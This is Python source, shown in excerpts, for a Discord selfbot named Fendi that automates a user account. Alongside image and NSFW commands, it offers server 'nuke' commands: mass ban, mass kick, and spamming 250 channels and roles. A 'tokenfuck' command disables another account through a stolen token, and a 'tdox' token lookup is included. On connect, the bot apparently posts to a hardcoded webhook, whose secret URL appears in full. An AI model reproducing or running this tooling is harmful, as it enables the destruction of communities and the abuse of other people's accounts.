...
╚═╝     ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝    ╚══════╝╚══════╝╚══════╝╚═╝     ╚═════╝  ╚═════╝    ╚═╝   
                       ...
                       {Fore.CYAN}Fendi v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Fendi.user.name}#{Fendi.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Fendi.user.id}   
                       {Fore.CYAN}Nitro Sniper | {Fore.GREEN}{nitro}
                       {Fore.CYAN}Cached Users: {Fore.GREEN}{len(Fendi.users)}
                       {Fore.CYAN}Guilds: {Fore.GREEN}{len(Fendi.guilds)}
                       {Fore.CYAN}Prefix: {Fore.GREEN}{Fendi.command_prefix}
    ''' + Fore.RESET)
...
def Init():
    token = config.get('token')
    try:
        Fendi.run(token, bot=False, reconnect=True)
        os.system(f'title (Fendi Selfbot) - Version {SELFBOT.__version__}')
...
colorama.init()
Fendi = discord.Client()
Fendi = commands.Bot(
    description='Fendi Selfbot', command_prefix=prefix, self_bot=True)

Fendi.antiraid = False
Fendi.msgsniper = True
Fendi.slotbot_sniper = True
Fendi.giveaway_sniper = True
Fendi.mee6 = False
Fendi.mee6_channel = None
Fendi.yui_kiss_user = None
Fendi.yui_kiss_channel = None
Fendi.yui_hug_user = None
Fendi.yui_hug_channel = None
Fendi.sniped_message_dict = {}
Fendi.sniped_edited_message_dict = {}
Fendi.whitelisted_users = {}
Fendi.copycat = None
Fendi.remove_command('help')
...
async def on_message_edit(before, after):
    await Fendi.process_commands(after)


@Fendi.event
async def on_message(message):
    if Fendi.copycat is not None and Fendi.copycat.id == message.author.id:
    ...
    if f'Congratulations <@{Fendi.user.id}>' in message.content:
        if Fendi.giveaway_sniper:
            if message.author.id == 294882584201003009:
    ...
    await Fendi.process_commands(message)


@Fendi.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Fendi.antiraid is True:
        try:
            async for i in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Fendi.whitelisted_users.keys(
                ) and i.user.id in Fendi.whitelisted_users[
                        guild.id].keys() and i.user.id is not Fendi.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="Fendi Anti-Nuke Selfbot")
...
async def on_member_join(member):
    if Fendi.antiraid is True and member.bot:
        try:
            guild = member.guild
            async for i in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Fendi.whitelisted_users.keys(
                ) and i.user.id in Fendi.whitelisted_users[member.guild.
                                                            id].keys():
                    return
                else:
                    await guild.ban(member, reason="Fendi Anti-Nuke Selfbot")
                    await guild.ban(i.user, reason="Fendi Anti-Nuke Selfbot")
        except Exception as e:
            print(e)
...
@Fendi.command(aliases=["queue"])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(Fendi.voice_clients, guild=ctx.guild)
...
async def yuikiss(ctx, user: discord.User = None):
    ...
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
        ...
        if user is None:
            ...
            return
        Fendi.yui_kiss_user = user.id
        Fendi.yui_kiss_channel = ctx.channel.id
        if Fendi.yui_kiss_user is None or Fendi.yui_kiss_channel is None:
            await ctx.send(
                'An impossible error occured, try again later or contact swag')
            return
        while Fendi.yui_kiss_user is not None and Fendi.yui_kiss_channel is not None:
            await Fendi.get_channel(Fendi.yui_kiss_channel).send(
                'yui kiss ' + str(Fendi.yui_kiss_user), delete_after=0.1)
...
async def yuihug(ctx, user: discord.User = None):
    ...
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
            ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Hug in DMs or GCs you idiot.", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Hug", delete_after=3)
            return
        Fendi.yui_hug_user = user.id
        Fendi.yui_hug_channel = ctx.channel.id
        if Fendi.yui_hug_user is None or Fendi.yui_hug_channel is None:
            await ctx.send(
                'An impossible error occured, try again later or contact swag')
            return
        while Fendi.yui_hug_user is not None and Fendi.yui_hug_channel is not None:
            await Fendi.get_channel(Fendi.yui_hug_channel).send(
                'yui hug ' + str(Fendi.yui_hug_user), delete_after=0.1)
            await asyncio.sleep(60)
...
@Fendi.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    ...
    while Fendi.mee6 is True:
        ...
        await Fendi.get_channel(Fendi.mee6_channel).send(
            random.choice(sentences), delete_after=0.1)
        await asyncio.sleep(60)


@Fendi.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Fendi.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Fendi.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Fendi.slotbot_sniper = False
...
@Fendi.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Fendi.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Fendi.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Fendi.giveaway_sniper = False
...
async def on_message_delete(message):
    if message.author.id == Fendi.user.id:
        return
    if Fendi.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(
            ...
            if len(attachments) == 0:
                ...
                message_content = "`" + str(
                    ...
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Fendi.sniped_message_dict) > 1000:
        Fendi.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        ...
        message_content = "`" + str(
            discord.utils.escape_markdown(str(
                message.author))) + "`: " + str(message.content).replace(
                    "@everyone", "@\u200beveryone").replace(
                        "@here", "@\u200bhere")
        Fendi.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
...
@Fendi.event
async def on_message_edit(before, after):
    if before.author.id == Fendi.user.id:
        return
    if Fendi.msgsniper:
        ...
        if isinstance(before.channel, discord.DMChannel) or isinstance(
            ...
            if len(attachments) == 0:
                ...
                message_content = "`" + str(
                    ...
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Fendi.sniped_edited_message_dict) > 1000:
        Fendi.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
                        ...
                        "@everyone", "@\u200beveryone").replace(
                            "@here", "@\u200bhere") + "\n**AFTER**\n" + str(
                                after.content).replace(
                                    "@everyone", "@\u200beveryone").replace(
                                        "@here", "@\u200bhere")
        Fendi.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
...
async def snipe(ctx):
    ...
    if currentChannel in Fendi.sniped_message_dict:
        await ctx.send(Fendi.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")


@Fendi.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Fendi.sniped_edited_message_dict:
        await ctx.send(Fendi.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(name=f"𝘍𝘦𝘯𝘥𝘪 𝘚𝘦𝘭𝘧𝘣𝘰𝘵")
        embed.set_thumbnail(url=Fendi.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/825389028345511937/842282112329580544/fendi_selfbot.gif")
        ...
        embed.set_image(url="https://cdn.discordapp.com/attachments/823463070180311040/841210936995348520/image0.gif")
        embed.description = f"GENERAL COMMANDS"
        embed.add_field(name="uptime", value="return how long the selfbot has been running", inline=False)
        embed.add_field(name="prefix <prefix>", value="changes the selfbots prefix", inline=False)
        embed.add_field(name="ping", value="returns the selfbots ping", inline=False)
        embed.add_field(name="av <user>", value="returns the user's pfp", inline=False)
        embed.add_field(name="whois <user>", value=" returns users account info nd shit", inline=False)
        embed.add_field(name="tokeninfo <token>", value="shows information about a token", inline=False)
        embed.add_field(name="copyserver", value="makes a copys a server", inline=False)
        embed.add_field(name="rainbowrole <role>", value="makes the role rainbow (there are ratelimits)", inline=False)
        embed.add_field(name="serverinfo", value="returns information about a server", inline=False)
        embed.add_field(name="serverpfp", value="returns the servericon", inline=False)
        embed.add_field(name="banner", value="returns the server banner", inline=False)
        embed.add_field(name="shutdown", value="shutdowns the selfbot", inline=False)
        await ctx.send(embed=embed)
        ...
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/823463070180311040/841210744896094268/image0.gif"
        )
        embed.description = f"ACCOUNT COMMANDS"
        embed.add_field(name="ghost", value="makes your name and profile picture a ghost/invisible", inline=False)
        embed.add_field(name="pfpsteal", value="steals a users avatar and sets it as yours", inline=False)
        embed.add_field(name="setpfp <link>", value="sets your pfp using a link", inline=False)
        embed.add_field(name="hypesquad <hypesquad>", value="changes your hypesquad", inline=False)
        embed.add_field(name="cyclenick <text>", value="cycles through your nickname by letter", inline=False)
        embed.add_field(name="stopcyclenick", value="stops the cycle", inline=False)
        embed.add_field(name="streaming <text>", value="sets your status as streaming", inline=False)
        embed.add_field(name="playing <text>", value="sets your status as playing", inline=False)
        embed.add_field(name="watching <text>", value="sets your status as watching", inline=False)
        embed.add_field(name="listening <text>", value="sets your status as listening", inline=False)
        embed.add_field(name="stopactivity", value="resets your status", inline=False)
        embed.add_field(name="acceptfriends", value="accepts all friend requests", inline=False)
        embed.add_field(name="ignorefriends", value="ignores all friend requests", inline=False)
        embed.add_field(name="read", value="marks all server messages as read", inline=False)
        embed.add_field(name="adminservers", value="lists all servers you have admin in", inline=False)
        await ctx.send(embed=embed)
    elif str(category).lower() == "image":
        embed = discord.Embed(color=0x36393F, timestamp=ctx.message.created_at)
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/823463070180311040/841210664818049044/image0.gif"
        )
        embed.description = f"IMAGE MANIPULATION COMMANDS"
        embed.add_field(name="tweet <user> <message>", value="makes a fake tweet", inline=False)
        embed.add_field(name="magik <user>", value="magiks a user", inline=False)
        embed.add_field(name="fry <user>", value="frys a user", inline=False)
        embed.add_field(name="blur <user>", value="blurs a user", inline=False)
        embed.add_field(name="darksupreme <message>", value="makes a dark supreme logo", inline=False)
        embed.add_field(name="Supreme <message>", value="makes a supreme logo", inline=False)
        embed.add_field(name="phcomment <user> <message>", value="makes a fake ph comment", inline=False)
        embed.add_field(name="pornhub <logo-word 1> <logo-word 2>", value="makes a pornhub logo", inline=False)
        embed.add_field(name="gay <user>", value="makes a user gay", inline=False)
        await ctx.send(embed=embed)
        ...
        embed.description(name=f"NSFW COMMANDS", color=0x36393F)
        embed.add_field(name="hentai", value="sends hentai gifs", inline=False)
        embed.add_field(name="anal", value="sends anal pics", inline=False)
        embed.add_field(name="cumslut", value="sends cumslut pics", inline=False)
        embed.add_field(name="blowjob", value="shows blowjob pics", inline=False)
        embed.add_field(name="tits", value="shows tit pics", inline=False)
        embed.add_field(name="lesbian", value="shows lesbian pics", inline=False)
        embed.add_field(name="neko", value="shows neko pics", inline=False)
        await ctx.send(embed=embed)
        ...
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/823463070180311040/841210494370185246/image0.gif"
        )
...
@Fendi.command(aliases=["giphy", "tenor", "searchgif"])
        ...
        try:
            ...
            with io.BytesIO(image) as file:
                await ctx.send(
                    ...
                    file=discord.File(file, f"Fendi_anal.png"))
        except:
...
@Fendi.command(aliases=["addemoji", "stealemote", "addemote"])
...
@Fendi.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Fendi.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Fendi.copycat))
    Fendi.copycat = None


@Fendi.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Fendi.copycat = user
    await ctx.send("Now copying " + str(Fendi.copycat))


@Fendi.command(aliases=["9/11", "911", "terrorist"])
...
@Fendi.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
...
@Fendi.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Fendi Selfbot"
        name = "Fendi Selfbot"
...
@Fendi.command(aliases=["fakename"])
    ...
    async with aiohttp.ClientSession() as cs:
        async with cs.get(
            ...
            try:
                ...
                with io.BytesIO(image) as file:
                    await ctx.send(
                        file=discord.File(file, f"Fendi_tweet.png"))
            except:
                await ctx.send(res['message'])


@Fendi.command(aliases=["distort"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Fendi_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
...
@Fendi.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Fendi.guilds:
        await guild.ack()
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Fendi_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Fendi_blur.png"))
        except:
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Fendi_supreme.png"))
    except:
        await ctx.send(endpoint)
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Fendi_dark_supreme.png"))
    except:
        await ctx.send(endpoint)


@Fendi.command(aliases=["facts"])
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Fendi_facts.png"))
    except:
        await ctx.send(endpoint)


@Fendi.command(aliases=["blurp"])
        ...
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Fendi.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/842229009877172244/RrsQ8mGQDk5IIgrizF0MzLTqvHZaXZYuoazdPXWBqonKpVqLfkoMpKnWVQ3J9rc-PBP6',
...
async def gay(ctx, user: discord.Member = None):
    ...
    if user is None:
        ...
        avatar = str(user.avatar_url_as(format="gif"))
        endpoint += avatar
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Fendi.gif"))
        except:
            await ctx.send(endpoint)
...
@Fendi.command(aliases=["pornhublogo", "phlogo"])
...
@Fendi.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    ...
    try:
        ...
        with io.BytesIO(image) as file:
            await ctx.send(
                file=discord.File(file, f"Fendi.png"))
    except:
        await ctx.send(res["message"])
...
@Fendi.command(aliases=["reversesearch", "anticatfish", "catfish"])
...
@Fendi.command(aliases=['pfp', 'avatar'])
...
@Fendi.command(aliases=["del", "quickdel"])
...
@Fendi.command(name='1337speak', aliases=['leetspeak'])
...
async def ghost(ctx):
    ...
    if config.get('password') == 'password-here':
        ...
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await Fendi.user.edit(
                    password=password, username="ٴٴٴٴ", avatar=f.read())
            except discord.HTTPException as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Fendi.command(aliases=['pfpget', 'stealpfp'])
    ...
    if config.get('password') == 'password-here':
        ...
        try:
            ...
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await Fendi.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Fendi.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
...
@Fendi.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
...
@Fendi.command(aliases=['dong', 'penis'])
...
@Fendi.command(aliases=['changehypesquad'])
...
@Fendi.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    ...
    guild = {
        'channels': "fendi selfbot was here",
        'icon': "",
        'name': "fucked by fendi selfbot",
        'region': "europe"
    }
    for _i in range(50):
        requests.post(
...
async def fakenet(ctx, _type=None, *, name=None):
    ...
    if r.status_code == 200:
        ...
        await ctx.send(
            '**[ERROR]** `Fendi Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`'
        )


@Fendi.command(aliases=['tokinfo', 'tdox'])
...
@Fendi.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await Fendi.create_guild(f'{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Fendi.guilds:
...
@Fendi.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    ...
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="wizzed",
            reason="6Kun Owns You",
            icon=None,
            banner=None)
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="nuked by fendi selfbot")
    for _i in range(250):
        await ctx.guild.create_role(name="wizzed", color=RandomColor())


@Fendi.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="6kun Owns You")
        except:
            pass
...
@Fendi.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="kicked by fendi selfbot")
        except:
            pass


@Fendi.command(aliases=["spamroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Fendi On Top", color=RandomColor())
        except:
            return


@Fendi.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="mass channels by fendi selfbot")
        except:
            return


@Fendi.command(aliases=["delchannel"])
...
@Fendi.command(aliases=["deleteroles"])
...
@Fendi.command(aliases=["purgebans", "unbanall"])
...
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = Fendi.get_user(user.id)
    if ctx.author.id == Fendi.user.id:
        return
    else:
        try:
...
@Fendi.command(aliases=['rainbowrole'])
...
@Fendi.command(aliases=["guildinfo"])
...
@Fendi.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
...
@Fendi.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
...
@Fendi.command(aliases=['serverbanner'])
...
@Fendi.command(aliases=["renameserver", "nameserver"])
...
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Fendi.command_prefix = str(prefix)
...
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Fendi.user.relationships:
...
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Fendi.user.relationships)
    for relationship in Fendi.user.relationships:
...
@Fendi.command(aliases=["changeregions", "changeregion", "regionschange"])
...
async def feed(ctx, user: discord.Member):
    ...
    try:
        ...
        with io.BytesIO(image) as file:
            await ctx.send(
                user.mention, file=discord.File(file, f"Fendi.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
...
async def purge(ctx, amount: int):
    ...
    async for message in ctx.message.channel.history(limit=amount).filter(
            lambda m: m.author == Fendi.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass
...
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in Fendi.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@Fendi.command(aliases=["streaming"])
async def stream(ctx, *, message):
    ...
    await Fendi.change_presence(activity=stream)


@Fendi.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await Fendi.change_presence(activity=game)


@Fendi.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Fendi.change_presence(
...
async def stopactivity(ctx):
    await ctx.message.delete()
    await Fendi.change_presence(activity=None, status=discord.Status.dnd)
...
@Fendi.command(aliases=["fliptable"])
...
@Fendi.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Fendi.logout()


@Fendi.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
